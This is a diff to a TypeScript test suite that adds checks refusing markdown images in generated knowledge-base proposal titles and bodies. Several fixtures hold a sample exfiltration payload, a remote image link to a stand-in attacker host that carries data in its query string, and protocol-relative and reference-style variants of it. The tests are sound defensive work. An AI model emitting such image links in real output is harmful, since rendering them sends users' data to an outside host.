@@ -7,6 +7,7 @@ import {
   type ProposalOutput,
   RENDERED_URL_PROPERTIES,
   renderedBodyLinksToTicket,
+  renderedMarkdownHasImage,
   validateDraftFields,
   validateProposalOutput,
 } from "@/lib/kb/proposal-schema";
@@ -386,8 +387,12 @@ describe("review P8: every URL attribute of the rendered body", () => {
     expect(renderedBodyLinksToTicket(body)).toBe(true);
   });
 
-  it("allows an external image that is not a ticket page", () => {
-    expect(bodyRefusal("![logo](https://example.com/img/logo.png)").ok).toBe(true);
+  it("an external image is not a ticket page, but run decision K54 refuses it as an image", () => {
+    expect(bodyRefusal("![logo](https://example.com/img/logo.png)")).toEqual({
+      ok: false,
+      field: "bodyMarkdown",
+      code: "IMAGE_NOT_ALLOWED",
+    });
     expect(renderedBodyLinksToTicket("![logo](https://example.com/img/logo.png)")).toBe(false);
   });
 
@@ -469,5 +474,64 @@ describe("review R3-3: paths wrapped in punctuation", () => {
     expect(bodyRefusal("Read docs/tickets-guide first.").ok).toBe(true);
     expect(containsTicketLink("(/ticketsfoo).")).toBe(false);
     expect(containsTicketLink("docs/tickets-guide")).toBe(false);
+  });
+});
+
+describe("run decision K54: images are refused in title and body (review a2-CR-01)", () => {
+  const REMOTE = "![x](https://attacker.example/p.png?d=summary)";
+
+  it("refuses a remote image in the body at generation (IMAGE_IN_BODY, so INVALID_OUTPUT)", () => {
+    expect(reason({ bodyMarkdown: `## Steps\n\n${REMOTE}` })).toBe("IMAGE_IN_BODY");
+  });
+
+  it("refuses protocol-relative, relative and reference-style images in the body", () => {
+    expect(reason({ bodyMarkdown: "## Steps\n\n![x](//attacker.example/p.png)" })).toBe(
+      "IMAGE_IN_BODY",
+    );
+    expect(reason({ bodyMarkdown: "## Steps\n\n![logo](/img/logo.png)" })).toBe("IMAGE_IN_BODY");
+    expect(
+      reason({ bodyMarkdown: "## Steps\n\n![x][p]\n\n[p]: https://attacker.example/p.png" }),
+    ).toBe("IMAGE_IN_BODY");
+  });
+
+  it("refuses an image in the title at generation (IMAGE_IN_TITLE)", () => {
+    expect(reason({ title: `Reset guide ${REMOTE}` })).toBe("IMAGE_IN_TITLE");
+  });
+
+  it("validateDraftFields returns IMAGE_NOT_ALLOWED on bodyMarkdown for any image", () => {
+    for (const body of [
+      `## Steps\n\n${REMOTE}`,
+      "![x](//attacker.example/p.png)",
+      "![logo](/img/logo.png)",
+    ]) {
+      expect(bodyRefusal(body)).toEqual({
+        ok: false,
+        field: "bodyMarkdown",
+        code: "IMAGE_NOT_ALLOWED",
+      });
+    }
+  });
+
+  it("keeps the ticket-link check first for an image whose destination is a ticket page", () => {
+    expect(bodyRefusal("![x](/tickets/abc)")).toEqual({
+      ok: false,
+      field: "bodyMarkdown",
+      code: "TICKET_LINK",
+    });
+  });
+
+  it("allows a link (not an image) and image-like prose", () => {
+    expect(bodyRefusal("See [the guide](https://example.com/guide).").ok).toBe(true);
+    expect(bodyRefusal("Press the ! key, then [Enter].").ok).toBe(true);
+    expect(bodyRefusal("Inline code `![x](https://a.example/p.png)` is text.").ok).toBe(true);
+    expect(
+      reason({ bodyMarkdown: "## Steps\n\nSee [the guide](https://example.com/guide)." }),
+    ).toBe("OK");
+  });
+
+  it("renderedMarkdownHasImage finds an img in the rendered HTML only", () => {
+    expect(renderedMarkdownHasImage(REMOTE)).toBe(true);
+    expect(renderedMarkdownHasImage("[link](https://example.com)")).toBe(false);
+    expect(renderedMarkdownHasImage("Plain text.")).toBe(false);
   });
 });
